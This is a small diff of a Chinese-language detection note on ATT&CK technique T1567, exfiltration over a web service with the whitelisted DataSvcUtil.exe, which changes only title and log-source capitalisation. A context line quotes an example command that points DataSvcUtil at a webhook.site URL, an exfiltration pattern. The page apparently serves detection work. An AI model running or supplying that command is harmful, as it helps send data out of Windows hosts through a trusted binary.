@@ -1,4 +1,4 @@
-# T1567-win-通过Web服务进行渗透-DataSvcUtil.exe(白名单)
+# T1567-Win-通过Web服务进行渗透-DataSvcUtil.exe(白名单)
 
 ## 来自ATT&CK的描述
 
@@ -28,7 +28,7 @@ DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxx
 
 ## 检测日志
 
-windows安全日志
+Windows 安全日志
 
 ## 测试复现
 
